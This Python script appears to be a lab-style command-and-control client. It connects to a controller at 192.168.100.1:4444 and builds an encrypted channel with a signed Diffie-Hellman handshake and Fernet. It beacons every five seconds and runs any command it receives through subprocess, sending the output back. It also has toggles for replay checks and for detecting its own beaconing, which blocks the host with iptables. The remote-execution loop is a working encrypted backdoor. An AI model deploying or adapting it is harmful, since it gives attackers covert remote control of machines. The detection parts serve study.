import socket
import time
import subprocess
import os
import base64
import json
import uuid

from cryptography.hazmat.primitives.asymmetric import padding, dh
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.fernet import Fernet

HOST = "192.168.100.1"
PORT = 4444

# ================= TOGGLES =================
ENABLE_REPLAY_PROTECTION = True
ENABLE_INTERNAL_REPLAY_SIM = False
ENABLE_C2_DETECTION = True

# ================= LOAD SERVER PUBLIC KEY =================
with open("server_public.pem", "rb") as f:
    server_rsa_public = serialization.load_pem_public_key(f.read())

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))
client.settimeout(1)

print("[+] Connected to server")

# ================= HANDSHAKE =================
print("[*] Performing secure handshake...")

dh_len = int.from_bytes(client.recv(4), 'big')
dh_bytes = client.recv(dh_len)

sig_len = int.from_bytes(client.recv(4), 'big')
signature = client.recv(sig_len)

try:
    server_rsa_public.verify(
        signature,
        dh_bytes,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )
    print("[+] RSA verification successful (Trusted Server)")
except Exception:
    print("[❌] RSA verification failed! Possible MITM attack")
    client.close()
    exit()

server_dh_public = serialization.load_pem_public_key(dh_bytes)
server_parameters = server_dh_public.parameters()

client_private = server_parameters.generate_private_key()
client_public = client_private.public_key()

client_bytes = client_public.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

client.send(len(client_bytes).to_bytes(4, 'big'))
client.send(client_bytes)

shared_key = client_private.exchange(server_dh_public)

derived_key = HKDF(
    algorithm=hashes.SHA256(),
    length=32,
    salt=None,
    info=b'handshake data'
).derive(shared_key)

fernet_key = base64.urlsafe_b64encode(derived_key)
cipher = Fernet(fernet_key)

print("[+] Secure channel established!")

# ================= MESSAGE HELPERS =================

def create_message(msg_type, data):
    return json.dumps({
        "ts": time.time(),
        "nonce": str(uuid.uuid4()),
        "type": msg_type,
        "data": data
    }).encode()

def encrypt_message(msg_bytes):
    return cipher.encrypt(msg_bytes)

def decrypt_message(cipher_bytes):
    return json.loads(cipher.decrypt(cipher_bytes).decode())

# ================= REPLAY DETECTION =================

seen_nonces = set()
TIME_WINDOW = 10

def is_replay(ts, nonce, simulate=False):
    if not ENABLE_REPLAY_PROTECTION:
        return False

    current_time = time.time()

    if abs(current_time - ts) > TIME_WINDOW:
        print("[!] Replay detected (old timestamp)")
        return True

    if nonce in seen_nonces:
        print("[!] Replay detected (duplicate nonce)")
        return True

    # 🔴 Only store for real messages (not simulation)
    if not simulate:
        seen_nonces.add(nonce)

    return False

# ================= DETECTION VARIABLES =================
last_time = None
intervals = []
window_size = 5
alert_triggered = False
blocked = False

def block_ip(ip):
    print(f"\n Blocking C2 Server: {ip}\n")
    os.system(f"sudo iptables -A OUTPUT -d {ip} -j REJECT")
    os.system(f"sudo iptables -A INPUT -s {ip} -j REJECT")

# ================= MAIN LOOP =================

while True:
    try:
        current_time = time.time()

        # Send BEACON
        beacon_msg = create_message("BEACON", "HELLO_FROM_CLIENT")
        client.send(encrypt_message(beacon_msg))

        # ===== C2 DETECTION =====
        if ENABLE_C2_DETECTION and last_time is not None:
            interval = current_time - last_time
            intervals.append(interval)

            if len(intervals) > window_size:
                intervals.pop(0)

            print(f"[DEBUG] Interval: {interval:.2f} sec")

            if len(intervals) == window_size:
                avg = sum(intervals) / len(intervals)

                if all(abs(i - avg) < 0.7 for i in intervals):
                    if not alert_triggered:
                        print("\n [ALERT] C2 Beaconing Detected!\n")
                        alert_triggered = True

                        if not blocked:
                            block_ip(HOST)
                            blocked = True
                            client.close()
                            print("[+] Connection terminated after blocking")
                            break
                else:
                    alert_triggered = False

        last_time = current_time

        # ===== RECEIVE COMMAND =====
        try:
            data = client.recv(4096)

            if data:
                last_packet = data
                parsed = decrypt_message(data)

                if parsed["type"] == "CMD":
                    ts = parsed["ts"]
                    nonce = parsed["nonce"]
                    command = parsed["data"]

                    # REAL replay check
                    if is_replay(ts, nonce):
                        continue

                    print("[CMD RECEIVED]:", command)

                    if command.lower() == "exit":
                        break

                    output = subprocess.getoutput(command)

                    response = create_message("RESULT", output)
                    client.send(encrypt_message(response))

                    # ===== INTERNAL REPLAY SIMULATION =====
                    if ENABLE_INTERNAL_REPLAY_SIM:
                        print("[*] Simulating replay...")

                        parsed_replay = decrypt_message(last_packet)
                        ts_r = parsed_replay["ts"]
                        nonce_r = parsed_replay["nonce"]

                        if is_replay(ts_r, nonce_r, simulate=True):
                            print("[!] Replay detected (internal)")
                        else:
                            print("[!] Replay NOT detected (vulnerable)")

        except socket.timeout:
            pass

        time.sleep(5)

    except Exception as e:
        print("[ERROR]:", e)
        break

client.close()
